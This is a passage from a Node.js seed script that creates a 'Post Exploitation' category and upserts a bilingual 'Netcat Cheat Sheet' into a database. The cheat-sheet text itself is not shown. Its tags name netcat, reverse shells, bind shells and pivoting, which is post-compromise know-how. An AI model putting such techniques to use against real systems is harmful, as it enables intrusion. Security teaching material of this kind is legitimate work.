            console.log('Category "Post Exploitation" not found, creating...');
            category = await Category.create({
                name: { tr: 'Post Exploitation', en: 'Post Exploitation' },
                description: { tr: 'Sistem ele geçirme sonrası araçlar', en: 'Post-compromise tools and techniques' },
                slug: 'post-exploitation',
                icon: 'Terminal'
            });
        }

        const result = await Cheatsheet.findOneAndUpdate(
            { 'title.en': 'Netcat Cheat Sheet' },
            {
                title: { tr: 'Netcat Cheat Sheet', en: 'Netcat Cheat Sheet' },
                description: { tr: contentTR, en: contentEN },
                category: category._id,
                tags: ['netcat', 'nc', 'ncat', 'reverse-shell', 'bind-shell', 'pivoting', 'file-transfer', 'port-scanning']
            },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        );

        console.log('Netcat cheatsheet updated successfully:', result.title);
    } catch (error) {
        console.error('Error:', error);
    } finally {
        await mongoose.disconnect();
    }
}

updateNetcat();
